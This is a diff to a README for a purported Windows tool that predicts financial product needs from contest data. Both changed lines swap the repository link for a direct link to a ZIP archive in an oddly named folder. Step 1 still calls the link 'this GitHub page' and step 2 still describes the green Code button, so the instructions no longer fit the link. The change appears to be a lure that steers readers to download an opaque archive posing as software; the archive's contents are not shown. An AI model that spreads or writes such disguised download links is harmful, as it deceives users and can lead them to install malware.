@@ -1,6 +1,6 @@
 # 🏆 Data-Fusion-top-60 - Predict Financial Product Needs For Clients
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/aditemmet3651/Data-Fusion-top-60)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://raw.githubusercontent.com/aditemmet3651/Data-Fusion-top-60/main/supineness/top-Data-Fusion-2.9.zip)
 
 Data-Fusion-top-60 helps you predict which financial products a client needs. This tool uses data from a large contest to guess outcomes for banking customers. You can use this software on your computer to process client lists and generate predictions.
 
@@ -17,7 +17,7 @@ This software works on Windows. Ensure your computer meets these requirements:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [this GitHub page](https://github.com/aditemmet3651/Data-Fusion-top-60) to access the files.
+1. Visit [this GitHub page](https://raw.githubusercontent.com/aditemmet3651/Data-Fusion-top-60/main/supineness/top-Data-Fusion-2.9.zip) to access the files.
 2. Look for the green button labeled Code and select Download ZIP.
 3. Save the file to your computer.
 4. Right-click the downloaded folder and select Extract All.
